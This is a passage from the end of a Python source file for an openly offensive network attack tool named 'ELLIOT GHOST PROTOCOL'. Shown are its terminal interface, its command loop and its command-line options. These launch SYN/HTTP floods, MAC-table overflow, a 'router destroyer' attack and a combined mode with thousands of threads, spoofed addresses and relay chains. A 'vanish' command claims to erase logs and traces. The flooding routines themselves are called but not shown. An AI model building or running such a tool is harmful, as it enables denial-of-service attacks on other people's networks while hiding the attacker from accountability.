            print(f"\033[1;37m║\033[0m \033[1;36mDuration:\033[0m       \033[1;32m{elapsed:.2f}s\033[0m\033[1;37m{' '*43}║\033[0m")
            print(f"\033[1;37m║\033[0m \033[1;36mPackets:\033[0m        \033[1;32m{self.packet_count:,}\033[0m\033[1;37m{' '*43}║\033[0m")
            print(f"\033[1;37m║\033[0m \033[1;36mData Sent:\033[0m      \033[1;32m{gb_sent:.4f} GB\033[0m\033[1;37m{' '*40}║\033[0m")
            print(f"\033[1;37m║\033[0m \033[1;36mSpeed:\033[0m          \033[1;32m{pps:,.0f} pps\033[0m\033[1;37m{' '*44}║\033[0m")
            print(f"\033[1;37m║\033[0m \033[1;36mBandwidth:\033[0m      \033[1;32m{mbps:.2f} Mbps\033[0m\033[1;37m{' '*41}║\033[0m")
            print(f"\033[1;37m║\033[0m \033[1;36mGhost Threads:\033[0m  \033[1;32m{active_threads}\033[0m\033[1;37m{' '*43}║\033[0m")
            print(f"\033[1;37m║\033[0m \033[1;36mSpoof Pool:\033[0m     \033[1;32m{len(self.spoof_pool)}\033[0m\033[1;37m{' '*46}║\033[0m")
            print(f"\033[1;37m║\033[0m \033[1;36mRelay Chain:\033[0m    \033[1;32m{len(self.relay_ips)} hosts\033[0m\033[1;37m{' '*42}║\033[0m")
        else:
            print(f"\033[1;37m║\033[0m \033[1;36mTarget:\033[0m         \033[1;30mNOT SET\033[0m\033[1;37m{' '*51}║\033[0m")
            print(f"\033[1;37m║\033[0m \033[1;36mSpoofed MAC:\033[0m    \033[1;30m{self.spoofed_mac}\033[0m\033[1;37m{' '*41}║\033[0m")
            print(f"\033[1;37m║\033[0m \033[1;36mHostname:\033[0m       \033[1;30m{self.spoofed_hostname}\033[0m\033[1;37m{' '*39}║\033[0m")
        
        print(f"\033[1;37m╠{'═'*70}╣\033[0m")
        print(f"\033[1;37m║\033[0m \033[1;37mCOMMANDS:\033[0m \033[0;32mattack\033[0m | \033[0;32mstop\033[0m | \033[0;32mstatus\033[0m | \033[0;32mvanish\033[0m | \033[0;32mexit\033[0m\033[1;37m{' '*10}║\033[0m")
        print(f"\033[1;37m╚{'═'*70}╝\033[0m")
        print()
        print(f"\033[1;30m  \"A ghost is never caught because a ghost was never there.\"\033[0m")
        print()
    
    def main_menu(self):
        self.authenticate()
        
        while self.running:
            self.display_ui()
            
            try:
                cmd = input("\033[1;32mroot@ghost:~# \033[0m").strip().lower()
                
                if cmd in ['exit', 'quit', 'q']:
                    if self.attack_active:
                        confirm = input("\033[1;33m  [!] Ghost protocol active. Vanish? [y/N]: \033[0m")
                        if confirm.lower() == 'y':
                            self.stop_attack()
                            self.running = False
                    else:
                        self.running = False
                    print("\n\033[1;31m  [*] VANISHING WITHOUT A TRACE...\033[0m")
                    self.glitch_effect("ERASING ALL LOGS... GONE", 0.3)
                    self.restore_identity()
                    time.sleep(0.5)
                
                elif cmd == 'attack':
                    if self.attack_active:
                        print("\033[1;33m  [!] Ghost protocol already active. Use 'stop' first.\033[0m")
                        time.sleep(1)
                        continue
                    
                    print(f"\n\033[1;31m{'═'*70}\033[0m")
                    print(f"\033[1;37m                    ☠ TARGET ACQUISITION ☠\033[0m")
                    print(f"\033[1;31m{'═'*70}\033[0m\n")
                    
                    target = input("\033[1;36m  [>] Target IP: \033[0m").strip()
                    if not target:
                        continue
                    
                    port_str = input("\033[1;36m  [>] Port [80]: \033[0m").strip()
                    port = int(port_str) if port_str else 80
                    
                    print(f"\n\033[1;31m{'─'*70}\033[0m")
                    print(f"\033[1;37m  GHOST PROTOCOLS:\033[0m\n")
                    print(f"  \033[1;33m[1]\033[0m \033[1;37mDIRECT FLOOD\033[0m       \033[1;30m- SYN/HTTP packet storm\033[0m")
                    print(f"  \033[1;33m[2]\033[0m \033[1;37mSWITCH BYPASS\033[0m      \033[1;30m- MAC table overflow\033[0m")
                    print(f"  \033[1;33m[3]\033[0m \033[1;31mROUTER DESTROYER\033[0m  \033[1;30m- Firmware/admin attack\033[0m")
                    print(f"  \033[1;33m[4]\033[0m \033[1;31mGHOST PROTOCOL\033[0m    \033[1;30m- FULL INVISIBILITY + ALL VECTORS\033[0m")
                    print(f"\033[1;31m{'─'*70}\033[0m\n")
                    
                    mode_str = input("\033[1;36m  [>] Protocol [4]: \033[0m").strip()
                    mode = int(mode_str) if mode_str else 4
                    
                    threads_str = input("\033[1;36m  [>] Ghosts [5000]: \033[0m").strip()
                    threads = int(threads_str) if threads_str else 5000
                    
                    print(f"\n\033[1;31m{'═'*70}\033[0m")
                    print(f"\033[1;33m  TARGET: {target}:{port}\033[0m")
                    print(f"\033[1;33m  PROTOCOL: {['DIRECT','SWITCH BYPASS','ROUTER DESTROYER','GHOST PROTOCOL'][mode-1]}\033[0m")
                    print(f"\033[1;33m  GHOSTS: {threads}\033[0m")
                    print(f"\033[1;31m{'═'*70}\033[0m")
                    
                    confirm = input(f"\n\033[1;31m  [⚠] INITIATE GHOST PROTOCOL? [y/N]: \033[0m").strip()
                    if confirm.lower() == 'y':
                        self.start_attack(target, port, threads, mode)
                
                elif cmd == 'stop':
                    if self.attack_active:
                        self.stop_attack()
                        print("\033[1;33m  [*] GHOST PROTOCOL TERMINATED.\033[0m")
                    else:
                        print("\033[1;33m  [!] No active protocol.\033[0m")
                    time.sleep(1)
                
                elif cmd == 'vanish':
                    print("\033[1;31m  [*] EMERGENCY VANISH PROTOCOL...\033[0m")
                    self.stop_attack()
                    self.restore_identity()
                    self.cleanup()
                    print("\033[1;31m  [*] ALL TRACES ERASED. GOODBYE.\033[0m")
                    time.sleep(1)
                    sys.exit(0)
                
                elif cmd == 'status':
                    pass
                
                elif cmd == 'clear':
                    self.clear_screen()
                
                elif cmd == 'whoami':
                    print(f"\033[1;32m  You are nobody. You are a ghost.\033[0m")
                    print(f"\033[1;30m  Spoofed: {self.spoofed_hostname} | MAC: {self.spoofed_mac}\033[0m")
                    print(f"\033[1;30m  Real IP: HIDDEN | Real MAC: HIDDEN\033[0m")
                    input("\n  Press Enter...")
                
                elif cmd == '':
                    pass
                
                else:
                    print(f"\033[1;31m  [✗] Unknown: {cmd}\033[0m")
                    time.sleep(0.5)
                    
            except KeyboardInterrupt:
                if self.attack_active:
                    print("\n\033[1;33m  [!] Use 'stop' or 'vanish'\033[0m")
                else:
                    print("\n\033[1;33m  [!] Use 'exit' or 'vanish'\033[0m")
                time.sleep(0.5)
            except ValueError:
                print("\033[1;31m  [✗] Invalid\033[0m")
                time.sleep(0.5)

def main():
    if platform.system() == "Windows":
        os.system('color')
    
    elliot = Elliot()
    
    if len(sys.argv) > 1:
        if sys.argv[1] == "--help" or sys.argv[1] == "-h":
            print("""
    ELLIOT GHOST PROTOCOL v5.0 - Total Invisibility
    Usage: python3 elliot.py [OPTIONS]
    
    Options:
      --target IP PORT    Target
      --threads N         Ghost count (default: 5000)
      --mode N            1=DIRECT 2=SWITCH 3=ROUTER 4=GHOST
    
    Example:
      python3 elliot.py --target 192.168.1.1 80 --threads 8000 --mode 4
            """)
            sys.exit(0)
        
        target = None
        port = 80
        threads = 5000
        mode = 4
        
        i = 1
        while i < len(sys.argv):
            if sys.argv[i] == "--target":
                target = sys.argv[i+1]
                port = int(sys.argv[i+2])
                i += 3
            elif sys.argv[i] == "--threads":
                threads = int(sys.argv[i+1])
                i += 2
            elif sys.argv[i] == "--mode":
                mode = int(sys.argv[i+1])
                i += 2
            else:
                i += 1
        
        if target:
            elliot.authenticated = True
            elliot.start_attack(target, port, threads, mode)
            try:
                while elliot.running:
                    elliot.display_ui()
                    time.sleep(0.5)
            except KeyboardInterrupt:
                elliot.stop_attack()
                elliot.restore_identity()
                print("\n\033[1;31m  [*] VANISHED.\033[0m")
        else:
            elliot.main_menu()
    else:
        elliot.main_menu()

if __name__ == "__main__":
    main()